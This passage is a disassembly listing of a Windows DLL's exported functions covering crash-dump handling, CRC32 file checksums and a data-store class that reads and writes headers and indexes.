loc_6AF4006F:				; CODE XREF: Ordinal564+114j
		lea	ecx, [ebp+var_A8]
		call	Ordinal1172
		push	eax		; Str
		lea	ecx, [ebp+var_28]
		call	sub_6AF3B24F
		mov	eax, [ebp+var_28]
		mov	[ebp+var_2C], eax

loc_6AF40089:				; CODE XREF: Ordinal564+BBj
		lea	ecx, [ebp+var_A8]
		call	Ordinal1164
		jmp	loc_6AF40136
; ---------------------------------------------------------------------------

loc_6AF40099:				; DATA XREF: .rdata:6AF63130o
		push	13h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	ecx, [ebp+var_64]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF40131
		retn
; ---------------------------------------------------------------------------

loc_6AF400DC:				; DATA XREF: .rdata:6AF63140o
		push	15h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	eax, [ebp+var_54]
		push	dword ptr [eax]
		lea	eax, [ebp+SystemTime]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+SystemTime]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF40131
		retn
; ---------------------------------------------------------------------------

loc_6AF40131:				; DATA XREF: Ordinal564+1BBo
					; Ordinal564+210o
		mov	esi, [ebp+var_30]
		xor	edi, edi

loc_6AF40136:				; CODE XREF: Ordinal564+179j
		lea	ecx, [ebp+var_50]
		call	Ordinal752

loc_6AF4013E:				; CODE XREF: Ordinal564+7Cj
		cmp	[ebp+arg_4], edi
		lea	ecx, [esi+70h]	; int
		jnz	short loc_6AF4015F
		push	dword ptr [esi+8Ch] ; int
		push	[ebp+var_2C]	; Args
		call	Ordinal635
		test	eax, eax
		jnz	short loc_6AF4017F
		push	offset aCcrashhandl_11 ; "CCrashHandler::Dump()	: m_DebugHelp.Sna"...
		jmp	short loc_6AF40179
; ---------------------------------------------------------------------------

loc_6AF4015F:				; CODE XREF: Ordinal564+229j
		push	[ebp+arg_4]	; int
		push	dword ptr [esi+8Ch] ; int
		push	[ebp+var_2C]	; Args
		call	Ordinal634
		test	eax, eax
		jnz	short loc_6AF4017F
		push	offset aCcrashhandl_12 ; "CCrashHandler::Dump()	: m_DebugHelp.Dum"...

loc_6AF40179:				; CODE XREF: Ordinal564+242j
		call	sub_6AF3102E
		pop	ecx

loc_6AF4017F:				; CODE XREF: Ordinal564+23Bj
					; Ordinal564+257j
		push	dword ptr [ebp+Args]
		mov	ecx, esi
		call	Ordinal569
		test	eax, eax
		jz	short loc_6AF4019C
		push	0FFFFFFFFh	; uExitCode
		call	ds:GetCurrentProcess
		push	eax		; hProcess
		call	ds:TerminateProcess

loc_6AF4019C:				; CODE XREF: Ordinal564+270j
		mov	ecx, [ebp+var_28]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D

loc_6AF401A7:				; CODE XREF: Ordinal564+43j
		lea	ecx, [ebp+var_60]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal564	endp ; sp-analysis failed

; Exported entry 572.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal572(char	*Src)
		public Ordinal572
Ordinal572	proc near		; CODE XREF: Ordinal148+21Cp
					; DATA XREF: .rdata:off_6AF66098o

var_58		= byte ptr -58h
var_44		= byte ptr -44h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_72 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 4Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		mov	[ebp+var_14], eax
		lea	eax, [esi+90h]
		mov	[ebp+var_10], esp
		push	eax
		lea	ecx, [ebp+var_58]
		call	Ordinal1229
		and	[ebp+var_4], 0
		push	offset aCcrashhandlerS ; "CCrashHandler::SetDumpFileName()"
		lea	ecx, [ebp+var_44]
		call	Ordinal751
		push	[ebp+Src]	; Src
		lea	ecx, [esi+7Ch]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31B1D

loc_6AF40214:				; DATA XREF: sub_6AF4024E+3Do
					; sub_6AF40291+4Fo
		lea	ecx, [ebp+var_44]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_44]
		inc	esi
		call	Ordinal752
		lea	ecx, [ebp+var_58]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal572	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4024E	proc near		; DATA XREF: .rdata:6AF631A0o
		push	13h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	ecx, [ebp-4Ch]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF40214
		retn
sub_6AF4024E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF40291	proc near		; DATA XREF: .rdata:6AF631B0o
		push	15h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	eax, [ebp-48h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF40214
		retn
sub_6AF40291	endp

; Exported entry 580.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal580
Ordinal580	proc near		; CODE XREF: Ordinal581+1Cp
					; Ordinal582+5Dp
					; DATA XREF: ...

arg_0		= byte ptr  4
arg_4		= dword	ptr  8

		mov	ecx, [esp+arg_4]
		mov	eax, [ecx]
		push	esi
		movzx	esi, [esp+4+arg_0]
		mov	edx, eax
		and	edx, 0FFh
		xor	edx, esi
		shr	eax, 8
		xor	eax, ds:dword_6AF5A620[edx*4]
		pop	esi
		mov	[ecx], eax
		retn
Ordinal580	endp

; Exported entry 581.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal581
Ordinal581	proc near		; CODE XREF: Ordinal433+2BEp
					; Ordinal611+D7p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		or	[ebp+var_4], 0FFFFFFFFh
		push	esi
		xor	esi, esi
		cmp	[ebp+arg_4], esi
		jbe	short loc_6AF40333

loc_6AF4031A:				; CODE XREF: Ordinal581+27j
		lea	eax, [ebp+var_4]
		push	eax
		mov	eax, [ebp+arg_0]
		movzx	eax, byte ptr [esi+eax]
		push	eax
		call	Ordinal580
		inc	esi
		cmp	esi, [ebp+arg_4]
		pop	ecx
		pop	ecx
		jb	short loc_6AF4031A

loc_6AF40333:				; CODE XREF: Ordinal581+Ej
		mov	eax, [ebp+var_4]
		not	eax
		pop	esi
		leave
		retn
Ordinal581	endp

; Exported entry 582.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal582(int, LONG lDistanceToMove, int, int, int, int)
		public Ordinal582
Ordinal582	proc near		; CODE XREF: Ordinal583+50p
					; Ordinal588+81p ...

Buffer		= byte ptr -2004h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
lDistanceToMove	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		mov	eax, 2004h
		call	__alloca_probe
		mov	eax, ___security_cookie
		push	ebx
		mov	ebx, [ebp+arg_C]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_14]
		or	dword ptr [eax], 0FFFFFFFFh
		push	esi
		push	edi

loc_6AF4035C:				; CODE XREF: Ordinal582+79j
		mov	esi, 2000h
		cmp	ebx, esi
		ja	short loc_6AF4036B
		test	ebx, ebx
		mov	esi, ebx
		jz	short loc_6AF403B6

loc_6AF4036B:				; CODE XREF: Ordinal582+28j
		mov	ecx, [ebp+arg_0]
		push	esi		; nNumberOfBytesToRead
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	[ebp+arg_8]	; int
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		call	Ordinal779
		test	eax, eax
		jz	short loc_6AF403BD
		xor	edi, edi
		test	esi, esi
		jbe	short loc_6AF403A4

loc_6AF4038B:				; CODE XREF: Ordinal582+67j
		push	[ebp+arg_14]
		xor	eax, eax
		mov	al, [ebp+edi+Buffer]
		push	eax
		call	Ordinal580
		inc	edi
		cmp	edi, esi
		pop	ecx
		pop	ecx
		jb	short loc_6AF4038B

loc_6AF403A4:				; CODE XREF: Ordinal582+4Ej
		xor	eax, eax
		sub	ebx, esi
		sbb	[ebp+arg_10], eax
		add	[ebp+lDistanceToMove], esi
		adc	[ebp+arg_8], eax
		mov	eax, [ebp+arg_14]
		jmp	short loc_6AF4035C
; ---------------------------------------------------------------------------

loc_6AF403B6:				; CODE XREF: Ordinal582+2Ej
		not	dword ptr [eax]
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF403CA
; ---------------------------------------------------------------------------

loc_6AF403BD:				; CODE XREF: Ordinal582+48j
		push	offset aCcrc32FileFile ; "CCRC32::File() : FileObject.Read() ==	F"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF403CA:				; CODE XREF: Ordinal582+80j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
Ordinal582	endp

; Exported entry 583.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal583(LPCSTR	Args, LONG lDistanceToMove, int, int, int, int)
		public Ordinal583
Ordinal583	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch
Args		= dword	ptr  8
lDistanceToMove	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		lea	ecx, [ebp+var_C]
		call	Ordinal768
		xor	esi, esi
		push	esi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	1		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_C]
		call	Ordinal773
		test	eax, eax
		jnz	short loc_6AF40414
		push	offset aCcrc32FileFi_0 ; "CCRC32::File() : file.Open() == FALSE\n"
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF40431
; ---------------------------------------------------------------------------

loc_6AF40414:				; CODE XREF: Ordinal583+2Ej
		push	[ebp+arg_14]	; int
		lea	eax, [ebp+var_C]
		push	[ebp+arg_10]	; int
		push	[ebp+arg_C]	; int
		push	[ebp+arg_8]	; int
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		push	eax		; int
		call	Ordinal582
		add	esp, 18h
		mov	esi, eax

loc_6AF40431:				; CODE XREF: Ordinal583+3Bj
		lea	ecx, [ebp+var_C]
		call	Ordinal770
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal583	endp

; Exported entry 584.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal584
Ordinal584	proc near		; CODE XREF: Ordinal425+13p
					; Ordinal597+3Ep
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [esi+8]
		mov	dword ptr [esi], offset	off_6AF5AA78
		call	Ordinal768
		xor	edi, edi
		lea	ecx, [esi+84h]
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	dword ptr [esi+1Ch], 1
		mov	[esi+20h], edi
		call	Ordinal1278
		mov	eax, [esp+8+arg_0]
		mov	[esi+0A4h], eax
		mov	eax, [esp+8+arg_4]
		mov	[esi+0A8h], eax
		mov	eax, [esp+8+arg_8]
		mov	[esi+0ACh], eax
		mov	eax, [esp+8+arg_C]
		push	4		; Size
		mov	[esi+0B0h], eax
		lea	eax, [esi+80h]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		push	58h		; Size
		lea	eax, [esi+28h]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 18h
		pop	edi
		mov	eax, esi
		pop	esi
		retn	10h
Ordinal584	endp

; Exported entry 595.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal595(int,	LPCVOID	lpBuffer, DWORD	nNumberOfBytesToWrite)
		public Ordinal595
Ordinal595	proc near		; CODE XREF: Ordinal438+10p
					; Ordinal442+8p
					; DATA XREF: ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+nNumberOfBytesToWrite]
		lea	edx, [eax+ecx]
		cmp	edx, [esi+20h]
		ja	short loc_6AF40538
		cmp	ecx, ebx
		jz	short loc_6AF40538
		cmp	[ebp+lpBuffer],	ebx
		jz	short loc_6AF40538
		push	ecx		; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		add	eax, 20h
		push	ebx		; int
		lea	edi, [esi+8]
		push	eax		; lDistanceToMove
		mov	ecx, edi
		call	Ordinal781
		test	eax, eax
		jnz	short loc_6AF4050E
		push	offset aCdatastoreWrit ; "CDataStore::WriteHeader() : m_File.Writ"...
		jmp	short loc_6AF4053D
; ---------------------------------------------------------------------------

loc_6AF4050E:				; CODE XREF: Ordinal595+4Bj
		cmp	[esi+18h], ebx
		jz	short loc_6AF40533
		mov	ecx, edi
		call	Ordinal785
		test	eax, eax
		jnz	short loc_6AF40533
		mov	ecx, edi
		call	Ordinal236
		push	offset aCdatastoreWr_0 ; "CDataStore::WriteHeader() : m_File.Flus"...
		mov	[esi+14h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF40533:				; CODE XREF: Ordinal595+57j
					; Ordinal595+62j
		xor	ebx, ebx
		inc	ebx
		jmp	short loc_6AF40543
; ---------------------------------------------------------------------------

loc_6AF40538:				; CODE XREF: Ordinal595+2Bj
					; Ordinal595+2Fj ...
		push	offset aCdatastoreWr_1 ; "CDataStore::WriteHeader() : dwOffset + "...

loc_6AF4053D:				; CODE XREF: Ordinal595+52j
		call	sub_6AF3102E
		pop	ecx

loc_6AF40543:				; CODE XREF: Ordinal595+7Cj
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	0Ch
Ordinal595	endp

; Exported entry 596.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal596(int,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
		public Ordinal596
Ordinal596	proc near		; CODE XREF: Ordinal439+10p
					; Ordinal443+1Dp
					; DATA XREF: ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToRead= dword ptr	 10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+nNumberOfBytesToRead]
		lea	edx, [eax+ecx]
		cmp	edx, [esi+20h]
		ja	short loc_6AF405AA
		test	ecx, ecx
		jz	short loc_6AF405AA
		cmp	[ebp+lpBuffer],	0
		jz	short loc_6AF405AA
		push	ecx		; nNumberOfBytesToRead
		push	[ebp+lpBuffer]	; lpBuffer
		add	eax, 20h
		push	0		; int
		push	eax		; lDistanceToMove
		lea	ecx, [esi+8]
		call	Ordinal779
		test	eax, eax
		jnz	short loc_6AF405A5
		push	offset aCdatastoreRead ; "CDataStore::ReadHeader() : m_File.Read("...
		jmp	short loc_6AF405AF
; ---------------------------------------------------------------------------

loc_6AF405A5:				; CODE XREF: Ordinal596+48j
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF405B7
; ---------------------------------------------------------------------------

loc_6AF405AA:				; CODE XREF: Ordinal596+28j
					; Ordinal596+2Cj ...
		push	offset aCdatastoreRe_0 ; "CDataStore::ReadHeader() : dwOffset +	d"...

loc_6AF405AF:				; CODE XREF: Ordinal596+4Fj
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi

loc_6AF405B7:				; CODE XREF: Ordinal596+54j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	0Ch
Ordinal596	endp

; Exported entry 598.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal598
Ordinal598	proc near		; CODE XREF: Ordinal597+67p
					; DATA XREF: .rdata:off_6AF66098o

var_1C		= byte ptr -1Ch
var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		push	ebx
		push	esi
		mov	ebx, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [ebx+84h]
		push	eax
		lea	ecx, [ebp+var_1C]
		call	Ordinal1228
		mov	esi, [ebp+arg_0]
		test	esi, esi
		jnz	short loc_6AF405FA
		push	offset aCdatastoreAppe ; "CDataStore::AppendDataStore()	: pDataSt"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF40684
; ---------------------------------------------------------------------------

loc_6AF405FA:				; CODE XREF: Ordinal598+22j
		push	edi		; Args
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		push	4		; Size
		lea	edi, [esi+80h]
		push	0		; Val
		push	edi		; Dst
		call	memset
		mov	eax, [esi+1Ch]
		and	dword ptr [esi+1Ch], 0
		mov	[ebp+arg_0], eax
		mov	eax, [esi]
		add	esp, 0Ch
		mov	ecx, esi
		mov	[edi], ebx
		call	dword ptr [eax+4]
		test	eax, eax
		mov	[ebp+var_4], eax
		jnz	short loc_6AF40646
		push	offset aCappendstoreAp ; "CAppendStore::AppendDataStore() : pData"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF40646:				; CODE XREF: Ordinal598+73j
		mov	eax, [ebp+arg_0]
		and	dword ptr [edi], 0
		mov	[esi+1Ch], eax
		cmp	dword ptr [ebx+18h], 0
		pop	edi
		jz	short loc_6AF40679
		lea	esi, [ebx+8]
		mov	ecx, esi
		call	Ordinal785
		test	eax, eax
		jnz	short loc_6AF40679
		mov	ecx, esi
		call	Ordinal236
		push	offset aCdatastoreAp_0 ; "CDataStore::AppendDataStore()	: m_File."...
		mov	[ebx+14h], eax
		call	sub_6AF3102E
		pop	ecx

loc_6AF40679:				; CODE XREF: Ordinal598+8Ej
					; Ordinal598+9Cj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	esi, [ebp+var_4]

loc_6AF40684:				; CODE XREF: Ordinal598+2Fj
		lea	ecx, [ebp+var_1C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal598	endp

; Exported entry 599.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal599
Ordinal599	proc near		; CODE XREF: Ordinal440p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+20h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal599	endp

; Exported entry 600.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal600
Ordinal600	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+1Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal600	endp

; Exported entry 601.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal601
Ordinal601	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+1Ch], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal601	endp

; Exported entry 602.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal602
Ordinal602	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+18h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal602	endp

; Exported entry 603.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal603
Ordinal603	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebp+arg_0]
		lea	ecx, [ebp+var_C]
		mov	[esi+18h], eax
		call	Ordinal1230
		pop	esi
		leave
		retn	4
Ordinal603	endp

; Exported entry 604.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal604
Ordinal604	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+8]
		call	Ordinal1137
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal604	endp

; Exported entry 605.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal605
Ordinal605	proc near		; CODE XREF: Ordinal606+9p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	[ebp+arg_0]
		lea	ecx, [esi+8]
		call	Ordinal787
		lea	ecx, [ebp+var_C]
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal605	endp

; Exported entry 606.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal606
Ordinal606	proc near		; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		lea	eax, [ebp+var_8]
		push	eax
		call	Ordinal605
		test	eax, eax
		jnz	short loc_6AF407F7
		xor	edx, edx
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF407F7:				; CODE XREF: Ordinal606+10j
		mov	eax, [ebp+var_8]
		mov	edx, [ebp+var_4]
		leave
		retn
Ordinal606	endp

; Exported entry 608.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal608
Ordinal608	proc near		; CODE XREF: Ordinal610+2Dp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+84h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+14h]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal608	endp

; Exported entry 611.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal611(LONG	lDistanceToMove, int, int, void	*lpBuffer)
		public Ordinal611
Ordinal611	proc near		; CODE XREF: Ordinal433+138p
					; Ordinal433+16Dp ...

var_30		= byte ptr -30h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
lDistanceToMove	= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
lpBuffer	= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		push	ebx
		mov	ebx, [ebp+lpBuffer]
		push	esi
		push	edi
		push	28h		; Size
		mov	edi, ecx
		push	0		; Val
		push	ebx		; Dst
		mov	[ebp+var_4], edi
		call	memset
		mov	esi, [ebp+arg_8]
		mov	eax, [esi]
		add	esp, 0Ch
		or	eax, [esi+4]
		jnz	short loc_6AF40875
		lea	ecx, [edi+8]
		push	esi
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF40875
		lea	ecx, [edi+8]
		call	Ordinal236
		mov	[edi+14h], eax
		push	offset aCdatastoreRe_1 ; "CDataStore::ReadIndex() : m_File.GetLen"...
		jmp	loc_6AF40991
; ---------------------------------------------------------------------------

loc_6AF40875:				; CODE XREF: Ordinal611+26j
					; Ordinal611+33j
		mov	eax, [edi+20h]
		mov	ecx, [esi]
		mov	esi, [esi+4]
		xor	edx, edx
		add	eax, 20h
		cmp	esi, edx
		jb	loc_6AF4098C
		ja	short loc_6AF40894
		cmp	ecx, eax
		jb	loc_6AF4098C

loc_6AF40894:				; CODE XREF: Ordinal611+5Fj
		cmp	[ebp+arg_4], edx
		jb	loc_6AF4098C
		ja	short loc_6AF408A8
		cmp	[ebp+lDistanceToMove], eax
		jb	loc_6AF4098C

loc_6AF408A8:				; CODE XREF: Ordinal611+72j
		add	ecx, 0FFFFFFD8h
		adc	esi, 0FFFFFFFFh
		cmp	[ebp+arg_4], esi
		ja	loc_6AF4098C
		jb	short loc_6AF408C2
		cmp	[ebp+lDistanceToMove], ecx
		ja	loc_6AF4098C

loc_6AF408C2:				; CODE XREF: Ordinal611+8Cj
		push	28h		; nNumberOfBytesToRead
		push	ebx		; lpBuffer
		push	[ebp+arg_4]	; int
		lea	esi, [edi+8]
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		mov	ecx, esi
		call	Ordinal779
		test	eax, eax
		jnz	short loc_6AF408ED
		mov	ecx, esi
